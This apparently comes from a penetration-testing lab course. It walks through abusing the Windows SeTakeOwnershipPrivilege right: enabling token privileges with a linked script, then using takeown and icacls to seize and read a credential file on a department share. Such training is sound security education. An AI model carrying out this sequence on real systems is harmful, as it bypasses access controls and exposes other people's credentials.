![](SeTakeOwnershipPrivilege-20260818-211458.png)

The setting can be set in Group Policy under:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`
![](SeTakeOwnershipPrivilege-20260818-211514.png)
## Leveraging the Privilege
#### Reviewing Current User Privileges

```powershell
PS C:\htb> whoami /priv
```
#### Enabling SeTakeOwnershipPrivilege

Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv
```
#### Choosing a Target File

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
#### Checking File Ownership

```powershell
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
```
#### Taking Ownership of the File

Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```powershell
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
#### Confirming Ownership Changed

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```
#### Modifying the File ACL

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt' 
cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied. At line:1 char:1
```

Let's grant our user full privileges over the target file.

```powershell
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
#### Reading the File

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
```
